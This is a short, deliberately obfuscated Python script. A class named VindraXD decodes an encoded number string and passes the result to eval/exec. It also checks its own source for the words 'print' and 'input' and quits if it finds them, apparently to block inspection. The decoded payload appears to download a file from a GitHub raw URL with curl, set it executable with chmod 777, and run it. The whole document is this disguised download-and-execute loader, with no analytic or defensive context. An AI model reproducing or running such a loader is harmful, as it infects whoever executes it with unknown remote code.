
class VindraXD():
 def __init__(self:object,_system:bool=False,_bits:float=0,*_delete:float,**_exec:bool)->exec:
  self._byte,_exec[_bits],self._exit,self._bit,_system,self._bytes=lambda _system:str(_exec[_bits](f"{self._bit[4]+self._bit[-13]+self._bit[4]+self._bit[2]}(''.join(%s),{self._bit[6]+self._bit[11]+self._bit[14]+self._bit[1]+self._bit[0]+self._bit[11]+self._bit[18]}())"%list(_system))).encode(self._bit[20]+self._bit[19]+self._bit[5]+self._bit[34])if _exec[_bits]==eval else exit(),eval,lambda _eval:"".join(chr(int(_marshal)-len(_eval.split('[')))if _marshal!='§'else'ζ'for _marshal in str(_eval).split('[')),exit()if _system else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _system:exit()if self._bit[15]+self._bit[17]+self._bit[8]+self._bit[13]+self._bit[19] in open(__file__, errors=self._bit[8]+self._bit[6]+self._bit[13]+self._bit[14]+self._bit[17]+self._bit[4]).read() or self._bit[8]+self._bit[13]+self._bit[15]+self._bit[20]+self._bit[19] in open(__file__, errors=self._bit[8]+self._bit[6]+self._bit[13]+self._bit[14]+self._bit[17]+self._bit[4]).read()else"".join(_system if _system not in self._bit else self._bit[self._bit.index(_system)+1 if self._bit.index(_system)+1<len(self._bit)else 0]for _system in "".join(chr(ord(t)-1)if t!="ζ"else"\n"for t in self._exit(_system))),lambda _encode:_system(_encode)
  return self.__marshal__(_exec[(self._bit[-1]+'_')[-1]+self._bit[18]+self._bit[15]+self._bit[0]+self._bit[17]+self._bit[10]+self._bit[11]+self._bit[4]])
 def __marshal__(self,_execute: str)->exec:return(None,self._byte(self._bytes(_execute)))[0]
VindraXD(_system=False,_sparkle='''262[274[271[269[193[271[275[193[265[269[272[271[274[276[193[275[281[275[276[261[269[193[218[275[193[275[§[275[201[200[263[265[276[193[272[277[268[268[200[202[§[275[201[200[259[277[274[268[193[206[237[193[264[276[276[272[275[219[208[208[263[265[276[264[277[258[207[259[271[269[208[269[274[206[260[265[272[276[271[206[275[276[271[274[261[208[207[207[207[207[208[258[268[271[258[208[269[218[265[270[208[276[261[275[276[280[224[274[218[279[222[276[274[277[261[193[206[271[193[276[261[275[276[280[200[202[§[275[201[200[259[264[269[271[260[193[215[215[215[193[276[261[275[276[280[200[202[§[275[201[200[207[208[276[261[275[276[280[200[202''')
